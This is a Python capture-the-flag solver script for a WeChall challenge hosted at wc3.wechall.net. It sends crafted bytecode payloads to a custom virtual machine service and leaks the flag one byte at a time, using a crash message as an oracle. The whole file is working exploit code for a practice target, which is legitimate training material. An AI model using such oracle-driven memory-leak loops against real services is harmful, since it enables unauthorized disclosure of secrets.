import socket
import sys
import string

HOST = "wc3.wechall.net"
PORT = 61221

def solve():
    flag = ""
    print(f"[*] Connecting to {HOST}:{PORT} to leak flag...")
    
    # Iterate through memory addresses to read the flag
    for addr in range(64):
        found_char = False
        
        # Test printable characters
        charset = string.printable
        
        for char in charset:
            # Skip chars that are valid opcodes (would not cause a crash on match)
            if char in ['\x00', '\x02', '\x03', '\x05', '\xfd', '\xfe', '\xff']:
                continue

            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((HOST, PORT))
                    
                    # --- Payload Construction ---
                    
                    # 1. Setup Address (Stack: [00, Addr])
                    #    Pushes parameters for the '03' Load operation.
                    setup = bytes([0x05, 0x00, 0xFD, 0x05, addr, 0xFD])
                    
                    # 2. Generator Sequence (Using '02' to write to the Code Stream)
                    
                    #    Gen '00' (Push 2 Bytes): Will capture the flag byte.
                    gen_capture = bytes.fromhex("0500FD02FD")
                    
                    #    Gen 'FD' (Delimiter): 
                    #    Inserted BEFORE the flag so '00' consumes [FD, Flag].
                    #    Stack pushes FD then Flag. Top of Stack becomes Flag.
                    gen_delim = bytes.fromhex("05FDFD02FD")
                    
                    #    Gen '03' (Load): Copies Flag Byte from Memory to Stream.
                    #    Stream becomes: ... 00 FD [FlagByte]
                    gen_load = bytes.fromhex("03FD")
                    
                    #    Gen '03' (Compare): Compares Stack Top (Flag) vs Next Byte.
                    gen_compare = bytes.fromhex("0503FD02FD")
                    
                    #    Gen Guess [Char]
                    gen_guess = bytes([0x05, ord(char), 0xFD, 0x02, 0xFD])
                    
                    # Final Payload
                    payload = setup + gen_capture + gen_delim + gen_load + gen_compare + gen_guess + b'\xFF'
                    
                    s.sendall(payload)
                    
                    response = b""
                    while True:
                        try:
                            chunk = s.recv(4096)
                            if not chunk: break
                            response += chunk
                        except socket.timeout:
                            break
                    
                    # Oracle Logic:
                    # Match -> Execute Guess -> Invalid Opcode -> Crash ("Invalid term!")
                    if b"Invalid term" in response:
                        flag += char
                        sys.stdout.write(char)
                        sys.stdout.flush()
                        found_char = True
                        break
                        
            except Exception:
                continue
        
        if not found_char:
            if len(flag) > 0: 
                print("\n[*] End of flag detected.")
                break
            
    print(f"\n[+] Flag: {flag}")

if __name__ == "__main__":
    solve()
